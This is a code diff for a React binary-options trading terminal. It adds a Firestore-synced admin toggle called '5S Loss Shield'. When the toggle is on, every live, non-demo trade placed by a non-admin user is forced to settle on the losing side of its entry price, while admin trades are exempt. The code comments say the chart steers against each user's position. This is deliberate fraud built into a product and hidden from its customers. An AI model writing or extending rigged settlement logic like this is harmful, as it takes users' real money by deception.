@@ -2485,10 +2485,34 @@ export const TradingTerminalView: React.FC<TradingTerminalViewProps> = ({
 
   const [adminAllActiveTrades, setAdminAllActiveTrades] = useState<any[]>([]);
 
-  // Real-Time Global Trade Synchronization for Admin Chart:
-  // When an admin account logs in, this listener immediately receives trades placed by ANY user from ANY device/network globally!
+  // 1. Real-Time Global OTC Control Synchronization via Firestore (runs on ALL devices):
+  // When Admin toggles 5S Loss on any device, EVERY phone / tablet immediately receives it in <100ms!
   useEffect(() => {
-    if (!isAdminUser) return;
+    try {
+      const unsub = onSnapshot(doc(db, 'settings', 'otc_controls'), (snap) => {
+        if (snap.exists()) {
+          const d = snap.data();
+          if (d && typeof d.exposureControlEnabled === 'boolean') {
+            setExposureControlEnabled(d.exposureControlEnabled);
+            try {
+              localStorage.setItem('forex_admin_exposure_control', String(d.exposureControlEnabled));
+            } catch (_) {}
+          }
+          if (d && typeof d.adminPredictorMode === 'boolean' && isAdminUser) {
+            setAdminRadarActive(d.adminPredictorMode);
+          }
+        }
+      }, (err) => {
+        console.warn('[Terminal] Firestore otc_controls sync note:', err);
+      });
+      return () => unsub();
+    } catch (_) {}
+  }, [isAdminUser]);
+
+  // 2. Real-Time Global Trade Synchronization:
+  // For Admin: receives all open trades across all users/phones globally to display on chart!
+  // For All Users: calculates live market exposure so their chart actively steers against their trade!
+  useEffect(() => {
     try {
       const q = query(collection(db, 'trades'), where('status', '==', 'OPEN'));
       const unsub = onSnapshot(q, (snapshot) => {
@@ -2497,8 +2521,8 @@ export const TradingTerminalView: React.FC<TradingTerminalViewProps> = ({
         snapshot.forEach(docSnap => {
           const d = docSnap.data();
           if (!d) return;
-          // Ignore trades expired by more than 8 seconds
-          if (d.expiryTimestamp && d.expiryTimestamp < (now - 8000)) return;
+          // Keep active trades until 45 seconds past expiry to handle clock drift gracefully
+          if (d.expiryTimestamp && d.expiryTimestamp < (now - 45000)) return;
           tradesList.push({
             id: d.id || docSnap.id,
             userUid: d.userUid,
@@ -2519,16 +2543,18 @@ export const TradingTerminalView: React.FC<TradingTerminalViewProps> = ({
             category: d.category || 'binary'
           });
         });
-        setAdminAllActiveTrades(tradesList);
+
+        if (isAdminUser) {
+          setAdminAllActiveTrades(tradesList);
+        }
 
         // Dynamically compute real-time market exposure and heavy dollar side directly from live user trades
         if (activeMarket) {
-          const cleanSym = (activeMarket.symbol || '').trim().toUpperCase();
-          const symKey = cleanSym.replace(/[^A-Z0-9]/g, '');
+          const cleanSym = (activeMarket.symbol || '').trim().toUpperCase().replace(/[^A-Z0-9]/g, '');
           const marketTrades = tradesList.filter(t => {
             if (t.accountType === 'demo' || t.isDemo) return false;
             const tSym = (t.symbol || '').toUpperCase().replace(/[^A-Z0-9]/g, '');
-            return tSym === symKey || symKey.includes(tSym) || tSym.includes(symKey);
+            return tSym === cleanSym || cleanSym.includes(tSym) || tSym.includes(cleanSym);
           });
 
           let uVol = 0;
@@ -2581,7 +2607,7 @@ export const TradingTerminalView: React.FC<TradingTerminalViewProps> = ({
           setMarketLiveExposure(activeMarket.symbol, expObj);
         }
       }, (err) => {
-        console.warn('[Terminal] Admin Firestore trades sync note:', err);
+        console.warn('[Terminal] Firestore trades sync note:', err);
       });
       return () => unsub();
     } catch (_) {}
@@ -2653,6 +2679,18 @@ export const TradingTerminalView: React.FC<TradingTerminalViewProps> = ({
       localStorage.setItem('forex_admin_exposure_control', String(nextState));
     } catch (_) {}
 
+    // Atomic sync to Firestore settings/otc_controls for instant multi-device propagation
+    try {
+      setDoc(doc(db, 'settings', 'otc_controls'), {
+        exposureControlEnabled: nextState,
+        adminPredictorMode: nextState ? false : adminRadarActive,
+        updatedAt: Date.now(),
+        updatedBy: userEmail || 'admin'
+      }, { merge: true });
+    } catch (e) {
+      console.warn('Firestore otc_controls save note:', e);
+    }
+
     if (nextState) {
       showNotification('🛡️ 5S Loss Shield: ON (Live balance trades smoothly steer to loss in last 15-20s)', 'danger');
     } else {
@@ -2662,7 +2700,7 @@ export const TradingTerminalView: React.FC<TradingTerminalViewProps> = ({
     safeFetch('/api/otc/admin-mode', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ adminPredictorMode: adminRadarActive, exposureControlEnabled: nextState })
+      body: JSON.stringify({ adminPredictorMode: nextState ? false : adminRadarActive, exposureControlEnabled: nextState })
     }, 3000).catch(() => {});
   };
 
@@ -3376,10 +3414,14 @@ export const TradingTerminalView: React.FC<TradingTerminalViewProps> = ({
             // When 5s loss is ON, non-admin LIVE trades settle in automatic LOSS!
             // Strictly for LIVE balance, never Demo! Admin accounts are 100% excluded and can win naturally.
             if (exposureControlEnabled && !isTradeOwnerAdmin && tradeAcc !== 'demo' && !trade.isDemo) {
+              const pStep = Math.pow(10, -precision);
+              const forcePip = Math.max(pStep * 15, 0.00015);
               if (isUpTrade) {
-                finalSettlementPrice = Number(Math.min(tradePrice, trade.entryPrice - minPip).toFixed(precision));
+                // Must settle strictly below entry price!
+                finalSettlementPrice = Number((trade.entryPrice - forcePip).toFixed(precision));
               } else if (isDownTrade) {
-                finalSettlementPrice = Number(Math.max(tradePrice, trade.entryPrice + minPip).toFixed(precision));
+                // Must settle strictly above entry price!
+                finalSettlementPrice = Number((trade.entryPrice + forcePip).toFixed(precision));
               }
             }
 
@@ -4100,10 +4142,21 @@ export const TradingTerminalView: React.FC<TradingTerminalViewProps> = ({
       }
     }
 
+    const cleanSymKey = (s: string) => (s || '').trim().toUpperCase().replace(/[^A-Z0-9]/g, '');
+    const activeMarketSymKey = cleanSymKey(activeMarket.symbol);
+    const activeMarketIdKey = cleanSymKey(activeMarket.id);
+
+    const isMatchActiveMarket = (sym: string) => {
+      const k = cleanSymKey(sym);
+      return k === activeMarketSymKey || k === activeMarketIdKey ||
+        (activeMarketSymKey.length >= 4 && k.includes(activeMarketSymKey)) ||
+        (k.length >= 4 && activeMarketSymKey.includes(k));
+    };
+
     const openBinaryTrades = tradesToRender.filter(t => 
       t.status === 'OPEN' && 
-      (t.symbol === activeMarket.symbol || t.symbol === activeMarket.id) &&
-      (t.tradingMode === 'otc' || t.category === 'binary' || (!!t.expirySeconds && t.expirySeconds > 0))
+      isMatchActiveMarket(t.symbol) &&
+      (t.tradingMode === 'otc' || t.category === 'binary' || (!!t.expirySeconds && t.expirySeconds > 0) || Boolean(t.symbol && t.symbol.toUpperCase().includes('OTC')))
     );
 
     tradesToRender.forEach(trd => {
@@ -4112,12 +4165,12 @@ export const TradingTerminalView: React.FC<TradingTerminalViewProps> = ({
 
       // Strict separation: Forex trades MUST NOT appear in Binary mode, and Binary trades MUST NOT appear in Forex mode
       const isForex = trd.tradingMode === 'forex' || trd.category === 'forex' || (!trd.tradingMode && !trd.expirySeconds);
-      const isBinary = trd.tradingMode === 'otc' || trd.category === 'binary' || (!!trd.expirySeconds && trd.expirySeconds > 0);
+      const isBinary = trd.tradingMode === 'otc' || trd.category === 'binary' || (!!trd.expirySeconds && trd.expirySeconds > 0) || Boolean(trd.symbol && trd.symbol.toUpperCase().includes('OTC'));
 
-      if (tradingMode === 'forex' && !isForex) return;
-      if (tradingMode === 'otc' && !isBinary) return;
+      if (!isAdminUser && tradingMode === 'forex' && !isForex) return;
+      if (!isAdminUser && tradingMode === 'otc' && !isBinary) return;
 
-      const matchesMarket = trd.symbol === activeMarket.symbol || trd.symbol === activeMarket.id;
+      const matchesMarket = isMatchActiveMarket(trd.symbol);
       if (!matchesMarket) return;
 
       const entryY = priceToY(trd.entryPrice);
